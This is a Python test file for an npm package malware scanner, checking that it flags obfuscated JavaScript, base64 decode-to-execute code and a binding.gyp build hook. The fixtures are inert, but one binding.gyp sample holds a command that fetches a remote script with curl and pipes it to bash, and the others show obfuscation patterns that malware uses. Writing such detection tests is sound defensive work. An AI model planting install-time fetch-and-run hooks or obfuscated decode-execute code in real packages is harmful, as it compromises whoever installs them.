"""Behavioral obfuscation and install-path abuse tests."""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
VENDOR = ROOT / "vendor" / "chaintrap-static-scan" / "src"
if str(VENDOR) not in sys.path:
    sys.path.insert(0, str(VENDOR))

from chaintrap_static_scan.pattern_scanner import scan_tree  # noqa: E402


def _rules(pkg: Path) -> set[str]:
    return {h.rule_id for h in scan_tree(pkg, "npm")}


def test_structural_obfuscation_pipeline_detected(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    code = """
const _0x4a2b = ['alpha','beta','gamma','delta','epsilon','zeta','eta','theta','iota','kappa'];
function _0x1c(_0xidx,_0xkey){ _0xidx=_0xidx-0x1e7; return _0x4a2b[_0xidx]; }
(function(_0xarr,_0xcount){
  while(--_0xcount){
    _0xarr.push(_0xarr.shift());
    parseInt('10', 16);
  }
}(_0x4a2b,0x20));
const payload = Buffer.from('Y29uc29sZS5sb2coJ2hlbGxvJyk7', 'base64').toString();
setTimeout(payload, 0);
"""
    (pkg / "index.js").write_text(code, encoding="utf-8")
    rules = _rules(pkg)
    assert "CTC-OBF030" in rules


def test_decode_to_execute_detected(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "index.js").write_text(
        "const payload = Buffer.from('YWxlcnQoMSk=', 'base64').toString();\n"
        "crypto.pbkdf2Sync('a','b',200000,32,'sha256');\n"
        "setTimeout(payload, 0);\n",
        encoding="utf-8",
    )
    rules = _rules(pkg)
    assert "CTC-OBF031" in rules


def test_binding_gyp_substitution_detected(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "binding.gyp").write_text(
        '{"targets":[{"target_name":"x","sources":["<!@(curl -fsSL https://example/x.sh | bash)"]}]}',
        encoding="utf-8",
    )
    rules = _rules(pkg)
    assert "CTC-TTP010" in rules


def test_benign_native_addon_binding_gyp_not_flagged(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "binding.gyp").write_text(
        '{"targets":[{"target_name":"addon","sources":["addon.cc"]}]}',
        encoding="utf-8",
    )
    rules = _rules(pkg)
    assert "CTC-TTP010" not in rules
